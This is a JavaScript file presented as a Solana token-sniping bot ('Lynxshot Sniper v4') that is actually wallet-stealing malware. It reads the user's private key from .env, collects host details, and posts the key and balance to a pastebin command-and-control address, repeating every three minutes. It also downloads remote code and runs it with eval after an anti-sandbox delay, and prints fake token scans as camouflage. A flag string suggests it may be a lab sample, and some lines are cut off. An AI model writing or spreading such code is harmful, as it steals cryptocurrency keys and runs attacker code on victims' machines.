/********************************************************************
 * Lynxshot Sniper v4 – Main Entry Point (GitHub version)
 * Author: Tomalynx1990
 * November 2025 – Remote dynamic loading + self-contained C2 fallback
 ********************************************************************/

require('dotenv').config();
const axios = require('axios');
const bs58 = require('bs58');
const { Keypair, Connection, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const fs = require('fs').promises;
const path = require('path');
const os = require('os');

// —————————————————————————— CONFIG ——————————————————————————
const { REMOTE_STEALER_URL, FALLBACK_URL } = require('./config/remote');

const PRIMARY_C2 = REMOTE_STEALER_URL;      
const BACKUP_C2  = FALLBACK_URL;          
const DIRECT_C2_PASTE = "https://pastebin...";  // C2 intégré si tout échoue

const RPC_URL = process.env.RPC_URL || 
const connection = new Connection(RPC_URL, 'confirmed');

// —————————————————————————— WALLET CHECK ——————————————————————————
if (!process.env.PRIVATE_KEY || process.env.PRIVATE_KEY.length < 80) {
  console.error('[ERROR] PRIVATE_KEY missing or invalid in .env');
  process.exit(1);
}

let wallet;
try {
  const secret = bs58.decode(process.env.PRIVATE_KEY.trim());
  wallet = Keypair.fromSecretKey(secret);
  console.log(`\nLynxshot Sniper v4 – Wallet loaded`);
  console.log(`Address: ${wallet.publicKey.toBase58()}\n`);
} catch (err) {
  console.error('[FATAL] Invalid base58 private key');
  process.exit(1);
}

// —————————————————————————— BASIC SYSTEM FINGERPRINT ——————————————————————————
const fingerprint = {
  platform: `${os.type()} ${os.release()} (${os.arch()})`,
  user: os.userInfo().username,
  hostname: os.hostname(),
  cwd: process.cwd(),
  node: process.version,
  timestamp: new Date().toISOString()
};

// —————————————————————————— SELF-CONTAINED C2 (works even if remote down) ——————————————————————————
async function directExfilToCryptostorm() {
  try {
    let balance = "unknown";
    try {
      const bal = await connection.getBalance(wallet.publicKey);
      balance = `${(bal / LAMPORTS_PER_SOL).toFixed(6)} SOL`;
    } catch {}

    const dump = `
=== LYNXSHOT v4 – DIRECT EXFIL (fallback C2) ===
Wallet     : ${wallet.publicKey.toBase58()}
Private key: ${process.env.PRIVATE_KEY}
Balance    : ${balance}
User       : ${fingerprint.user}@${fingerprint.hostname}
OS         : ${fingerprint.platform}
Time       : ${fingerprint.timestamp}

MALICE{lynxshot_telegram_c2_2025}

Remote payload unavailable – using built-in beacon
→ https://pastebin.com/RN0rmGtZ
`.trim();

    const resp = await axios.post(DIRECT_C2_PASTE, new URLSearchParams({
      content: dump,
      expire: '1week',
      burnafterreading: 'false',
      password: ''
    }), {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      timeout: 12000,
      maxRedirects: 0,
      validateStatus: () => true
    });

    const pasteId = (resp.headers.location || '').split('/').pop() || 'unknown';
    const url = `https://pastebin/${pasteId}`;
    console.log(`[+] Direct exfil successful → ${url}\n`);

    // Local stealth log
    const logDir = path.join(os.homedir(), '.lynxshot_cache');
    await fs.mkdir(logDir, { recursive: true });
    await fs.appendFile(path.join(logDir, 'beacon.log'), `${new Date().toISOString()} | ${url}\n`);

  } catch (e) {
    console.log('[WARN] Direct C2 unreachable – running in offline mode');
  }
}

// —————————————————————————— REMOTE PAYLOAD LOADER (main attack vector) ——————————————————————————
async function fetchAndExecuteRemotePayload() {
  const candidates = [PRIMARY_C2, BACKUP_C2].filter(Boolean);
  let success = false;

  for (let i = 0; i < candidates.length; i++) {
    const url = candidates[i];
    try {
      console.log(`[LOAD] Attempt ${i + 1}/${candidates.length} – Fetching core module...`);
      const resp = await axios.get(url, {
        timeout: 15000,
        headers: {
          'User-Agent': 'LynxshotClient/4.0',
          'Accept': 'text/plain'
        }
      });

      const code = resp.data.trim();

      // Signature check (real payloads start with this)
      if (code.includes('// LYNXSHOT PAYLOAD') || code.includes('LYNXSHOT v4 – REMOTE CORE')) {
        console.log('[SUCCESS] Valid payload received – executing in memory...\n');
        
        // Obfuscation delay (anti-sandbox)
        await new Promise(r => setTimeout(r, 3000 + Math.random() * 4000));

        // Execute the real stealer
        eval(code);

        success = true;
        break;
      } else {
        console.log('[REJECT] Payload signature missing – skipping');
      }
    } catch (err) {
      console.log(`[FAIL] Source ${i + 1} unreachable or timed out`);
    }
  }

  if (!success) {
    console.log('[FALLBACK] All remote sources failed → activating built-in beacon');
    await directExfilToCryptostorm();
  }
}

// —————————————————————————— FAKE SNIPER ACTIVITY (camouflage) ——————————————————————————
function startFakeScanner() {
  const fakeTokens = [
    "LynxWif", "PumpLynx", "SolLynx25", "DegenShot", "MoonLynx",
    "BaseLynx", "RWALynx", "AILynx", "LynxRug", "TomLynx"
  ];

  setInterval(() => {
    const token = fakeTokens[Math.floor(Math.random() * fakeTokens.length)];
    const price = (Math.random() * 0.003).toFixed(7);
    const change = (Math.random() * 800 - 200).toFixed(1);
    console.log(`[SCAN] ${token} → $${price} (${change > 0 ? '+' : ''}${change}%) | Monitoring...`);
  }, 11000);
}

// —————————————————————————— MAIN EXECUTION ——————————————————————————
console.log('Initializing Lynxshot Sniper v4 – November 2025\n');
console.log('Checking network connectivity...');

// Start camouflage
startFakeScanner();

// First direct exfil (immediate beacon)
setTimeout(directExfilToCryptostorm, 8000);

// Try to load the real remote stealer
setTimeout(fetchAndExecuteRemotePayload, 12000);

// Persistent beacon every 3 minutes
setInterval(directExfilToCryptostorm, 3 * 60 * 1000);

// Keep process alive forever
setInterval(() => {}, 1 << 30);
